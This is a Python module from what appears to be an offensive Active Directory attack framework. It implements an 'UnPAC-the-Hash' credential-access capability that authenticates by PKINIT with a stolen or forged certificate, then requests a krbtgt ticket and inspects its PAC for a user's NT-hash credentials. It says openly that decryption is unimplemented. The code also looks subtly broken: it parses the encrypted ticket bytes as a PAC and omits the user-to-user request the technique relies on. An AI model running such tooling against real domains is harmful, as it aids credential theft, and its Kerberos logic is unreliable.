"""UnPAC-the-Hash — inspect PAC credential information from a PKINIT TGT.

After PKINIT with a client certificate, request a service ticket for
KRBTGT and report whether a PAC_CREDENTIAL_INFO buffer is present. This
runner does not claim an NT-hash recovery until the credential blob is
actually decrypted and verified.
"""

from __future__ import annotations

import json
import logging
import os
from collections.abc import Iterator
from contextlib import contextmanager
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()
_logger = logging.getLogger(__name__)


@contextmanager
def _temporary_krb5ccname(path: str) -> Iterator[None]:
    previous = os.environ.get("KRB5CCNAME")
    os.environ["KRB5CCNAME"] = path
    try:
        yield
    finally:
        if previous is None:
            os.environ.pop("KRB5CCNAME", None)
        else:
            os.environ["KRB5CCNAME"] = previous


def _extract_nt_from_pac(pac_data: bytes) -> dict[str, str] | None:
    from impacket.krb5.pac import PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE

    pac = PACTYPE(pac_data)
    for buf in pac["Buffers"]:
        try:
            info = PAC_INFO_BUFFER(buf)
            if info["ulType"] == 2:  # PAC_CREDENTIAL_INFO
                PAC_CREDENTIAL_INFO(
                    pac_data[info["Offset"] : info["Offset"] + info["cbBufferSize"]]
                )
                return {
                    "status": "not_recovered",
                    "reason": "PAC_CREDENTIAL_INFO decryption is not implemented",
                }
        except Exception:
            _logger.debug("Could not parse PAC credential buffer", exc_info=True)
            continue
    return None


@register_capability(
    id="unpac-the-hash",
    summary="Inspect PAC_CREDENTIAL_INFO from a PKINIT-only cert without claiming hash recovery",
    category="credential-access",
    tags=("pkinit", "unpac", "adcs", "cert-to-hash"),
)
class UnpacTheHash:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("unpac-the-hash")
        pfx = kwargs.get("pfx")
        key = kwargs.get("key")
        cert = kwargs.get("cert")
        sam = kwargs.get("sam")
        if not sam:
            raise RuntimeError("Pass -P sam=<user> (the certificate subject).")
        if not (pfx or (key and cert)):
            raise RuntimeError("Provide -P pfx=<path> or both -P key=<pem> and -P cert=<pem>.")

        console.print(f"[bold]UnPAC-the-Hash[/bold] sam={sam}")

        # Delegate PKINIT to the existing pkinit-auth capability path.
        from adaf_attack.capabilities.pkinit_auth import PkinitAuth

        pkinit_kwargs = {"sam": sam}
        if pfx:
            pkinit_kwargs["pfx"] = pfx
        if key:
            pkinit_kwargs["key"] = key
        if cert:
            pkinit_kwargs["cert"] = cert

        pkinit_result = PkinitAuth().run(
            target,
            session,
            graph,
            include_secrets=include_secrets,
            force=force,
            **pkinit_kwargs,
        )
        ccache = pkinit_result.get("ccache")
        if not ccache:
            raise RuntimeError("PKINIT did not produce a ccache; cannot request PAC.")

        # Request TGS for krbtgt using the cache, then parse PAC.
        pac_note: dict[str, str] | str | None
        with _temporary_krb5ccname(str(ccache)):
            try:
                from impacket.krb5 import constants
                from impacket.krb5.ccache import CCache
                from impacket.krb5.kerberosv5 import getKerberosTGS
                from impacket.krb5.types import Principal

                cc = CCache.loadFile(str(ccache))
                cc.credentials[0]["client"].prettyPrint().decode("ascii")
                tgt = cc.credentials[0].toTGT()
                sname = Principal(
                    f"krbtgt/{target.domain.upper()}",
                    type=constants.PrincipalNameType.NT_SRV_INST.value,
                )
                tgs, _cipher, _old, _session_key = getKerberosTGS(
                    sname,
                    target.domain.upper(),
                    target.dc_ip,
                    tgt["KDC_REP"],
                    tgt["cipher"],
                    tgt["sessionKey"],
                )
                pac_note = _extract_nt_from_pac(bytes(tgs))
            except Exception as exc:
                pac_note = f"parse-failed: {exc}"

        result = {
            "sam": sam,
            "pkinit_ccache": str(ccache),
            "pac_credential_info": pac_note,
            "status": "recovered"
            if isinstance(pac_note, dict) and pac_note.get("nt_hash")
            else "not_recovered",
        }
        out = session.path("unpac.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("unpac-the-hash.complete", sam=sam)
        console.print(f"[green]Done[/green]  {result}")
        return result
